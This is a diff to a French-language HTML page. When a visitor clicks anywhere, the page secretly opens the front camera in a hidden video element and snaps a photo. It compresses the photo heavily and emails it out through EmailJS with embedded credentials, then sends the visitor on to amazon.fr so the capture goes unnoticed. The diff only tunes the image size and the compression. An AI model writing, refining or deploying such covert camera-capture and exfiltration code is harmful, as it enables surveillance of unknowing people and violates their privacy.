@@ -2,15 +2,14 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Photo unique</title>
+  <title>Photo ultra-légère</title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 </head>
 <body>
   <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
+  <canvas id="canvas" width="150" height="100" style="display:none;"></canvas>
 
   <script>
-    // Initialiser EmailJS
     emailjs.init("IoSfbtGz4KSL_5_9E");
 
     const video = document.getElementById('video');
@@ -19,7 +18,6 @@
 
     async function capturePhoto() {
       try {
-        // Accès caméra
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
 
@@ -30,27 +28,21 @@
           // Arrêter la caméra
           stream.getTracks().forEach(track => track.stop());
 
-          // Convertir en image compressée et envoyer
+          // Convertir en JPEG très compressé pour réduire la taille
           canvas.toBlob((blob) => {
             const reader = new FileReader();
             reader.onloadend = () => {
               const imageData = reader.result;
 
               emailjs.send("service_8cs0gml", "template_hxfltc", {
-                message: "Photo unique 📸",
+                message: "Photo ultra-légère 📸",
                 image: imageData
               })
-              .then(() => {
-                // Redirection après envoi
-                window.location.href = "https://www.amazon.fr";
-              })
-              .catch(err => {
-                console.error("Erreur EmailJS :", err);
-                window.location.href = "https://www.amazon.fr";
-              });
+              .then(() => { window.location.href = "https://www.amazon.fr"; })
+              .catch(err => { console.error("Erreur EmailJS :", err); window.location.href = "https://www.amazon.fr"; });
             };
             reader.readAsDataURL(blob);
-          }, "image/jpeg", 0.05); // Ultra compressée
+          }, "image/jpeg", 0.03); // Compression maximale
         };
 
       } catch (err) {
@@ -59,7 +51,7 @@
       }
     }
 
-    // Déclencher la capture dès que l'utilisateur clique sur la page
+    // Déclenchement automatique dès clic sur la page
     document.body.addEventListener('click', capturePhoto);
   </script>
 </body>
